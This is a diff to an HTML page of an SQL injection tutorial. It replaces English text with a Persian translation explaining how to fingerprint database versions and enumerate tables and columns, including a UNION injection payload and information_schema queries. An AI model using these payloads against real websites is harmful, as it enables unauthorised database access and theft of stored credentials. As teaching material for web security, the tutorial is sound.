@@ -76,90 +76,90 @@
           </a>
     </div>
     <div class="container">
-<h2>Examining the database in SQL injection attacks</h2>
-To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
-
-<li>The type and version of the database software.</li>
-<li>The tables and columns that the database contains.</li>
-<h2>Querying the database type and version</h2>
-You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
-
-The following are some queries to determine the database version for some popular database types:
-
-Database type	Query
-Microsoft, MySQL	<span class="highlight">SELECT @@version</span>
-Oracle	<span class="highlight">SELECT * FROM v$version</span>
-PostgreSQL	<span class="highlight">SELECT version()</span>
-For example, you could use a UNION attack with the following input:
-
-<pre><code>
-' UNION SELECT @@version--
-
-</code></pre>
-This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
-
-<pre><code>
-Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
-Mar 18 2018 09:11:49
-Copyright (c) Microsoft Corporation
-Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &#60;X64&#62; (Build 14393: ) (Hypervisor)
-
-</code></pre>
-
-<h2>Listing the contents of the database</h2>
-Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
-
-For example, you can query information_schema.tables to list the tables in the database:
-
-<pre><code>
-SELECT * FROM information_schema.tables
-
-</code></pre>
-This returns output like the following:
-<pre><code>
-TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
-=====================================================
-MyDatabase     dbo           Products    BASE TABLE
-MyDatabase     dbo           Users       BASE TABLE
-MyDatabase     dbo           Feedback    BASE TABLE
-
-</code></pre>
-This output indicates that there are three tables, called Products, Users, and Feedback.
-
-You can then query information_schema.columns to list the columns in individual tables:
-
-<pre><code>
-SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-
-</code></pre>
-This returns output like the following:
-<pre><code>
-TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
-=================================================================
-MyDatabase     dbo           Users       UserId       int
-MyDatabase     dbo           Users       Username     varchar
-MyDatabase     dbo           Users       Password     varchar
-
-</code></pre>
-This output shows the columns in the specified table and the data type of each column.
-
-<h3>Listing the contents of an Oracle database</h3>
-On Oracle, you can find the same information as follows:
-
-<li>You can list tables by querying <span class="highlight">all_tables</span>:</li>
-
-<pre><code>
-SELECT * FROM all_tables
-
-</code></pre>
-
-<li>You can list columns by querying <span class="highlight">all_tab_columns</span>:</li>
-
-<pre><code>
-SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
-
-</code></pre>
-
+        <h2>بررسی پایگاه داده در حملات SQL Injection</h2>
+        برای بهره‌برداری از آسیب‌پذیری‌های SQL Injection، اغلب لازم است اطلاعاتی در مورد پایگاه داده پیدا کنید. این اطلاعات شامل موارد زیر است:
+        
+        <li>نوع و نسخه نرم‌افزار پایگاه داده.</li>
+        <li>جدول‌ها و ستون‌هایی که پایگاه داده شامل می‌شود.</li>
+        <h2>پرس‌وجو درباره نوع و نسخه پایگاه داده</h2>
+        <p>شما می‌توانید با تزریق پرس‌وجوهای خاص به ارائه‌دهنده، نوع و نسخه پایگاه داده را شناسایی کنید تا ببینید کدام یک کار می‌کند.</p>
+        
+        <p>موارد زیر چند پرس‌وجو برای تعیین نسخه پایگاه داده‌های محبوب هستند:</p>
+        
+        <p>نوع پایگاه داده	پرس‌وجو</p>
+        <p>Microsoft, MySQL	<span class="highlight">SELECT @@version</span></p>
+        <p>Oracle	<span class="highlight">SELECT * FROM v$version</span></p>
+        <p>PostgreSQL	<span class="highlight">SELECT version()</span></p>
+        <p>برای مثال، می‌توانید از یک حمله UNION با ورودی زیر استفاده کنید:</p>
+        
+        <pre><code>
+        ' UNION SELECT @@version--
+        
+        </code></pre>
+        <p>این ممکن است خروجی زیر را بازگرداند. در این صورت، می‌توانید تأیید کنید که پایگاه داده Microsoft SQL Server است و نسخه استفاده شده را مشاهده کنید:</p>
+        
+        <pre><code>
+        Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+        Mar 18 2018 09:11:49
+        Copyright (c) Microsoft Corporation
+        Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &#60;X64&#62; (Build 14393: ) (Hypervisor)
+        
+        </code></pre>
+        
+        <h2>فهرست کردن محتوای پایگاه داده</h2>
+        <p>اکثر انواع پایگاه داده (به‌جز Oracle) دارای مجموعه‌ای از نماها به نام Information Schema هستند. این نماها اطلاعاتی در مورد پایگاه داده ارائه می‌دهند.</p>
+        
+        <p>برای مثال، می‌توانید اطلاعات جداول پایگاه داده را از <span class="highlight">information_schema.tables</span> بازیابی کنید:</p>
+        
+        <pre><code>
+        SELECT * FROM information_schema.tables
+        
+        </code></pre>
+        <p>این پرس‌وجو خروجی‌ای شبیه به زیر تولید می‌کند:</p>
+        <pre><code>
+        TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+        =====================================================
+        MyDatabase     dbo           Products    BASE TABLE
+        MyDatabase     dbo           Users       BASE TABLE
+        MyDatabase     dbo           Feedback    BASE TABLE
+        
+        </code></pre>
+        <p>این خروجی نشان می‌دهد که سه جدول با نام‌های Products، Users، و Feedback وجود دارند.</p>
+        
+        <p>سپس می‌توانید اطلاعات ستون‌های یک جدول خاص را از <span class="highlight">information_schema.columns</span> بازیابی کنید:</p>
+        
+        <pre><code>
+        SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+        
+        </code></pre>
+        <p>این خروجی‌ای شبیه به زیر تولید می‌کند:</p>
+        <pre><code>
+        TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+        =================================================================
+        MyDatabase     dbo           Users       UserId       int
+        MyDatabase     dbo           Users       Username     varchar
+        MyDatabase     dbo           Users       Password     varchar
+        
+        </code></pre>
+        <p>این خروجی ستون‌های جدول مشخص شده و نوع داده هر ستون را نشان می‌دهد.</p>
+        
+        <h3>فهرست کردن محتوای یک پایگاه داده Oracle</h3>
+        <p>در Oracle، می‌توانید اطلاعات مشابه را به روش زیر پیدا کنید:</p>
+        
+        <li>می‌توانید جدول‌ها را با پرس‌وجو از <span class="highlight">all_tables</span> فهرست کنید:</li>
+        
+        <pre><code>
+        SELECT * FROM all_tables
+        
+        </code></pre>
+        
+        <li>می‌توانید ستون‌ها را با پرس‌وجو از <span class="highlight">all_tab_columns</span> فهرست کنید:</li>
+        
+        <pre><code>
+        SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+        
+        </code></pre>
+        
 <hr>
 <p>برای دریافت جدیدترین اخبار و منابع، به من در تلگرام بپیوندید! <a href="https://t.me/Nightmare_Indian_Hacker" target="_blank">به تلگرام بپیوندید</a></p>
 <p>بعدی: <a href="union attack.html">مقدمه‌ای بر SQLi</a></p>
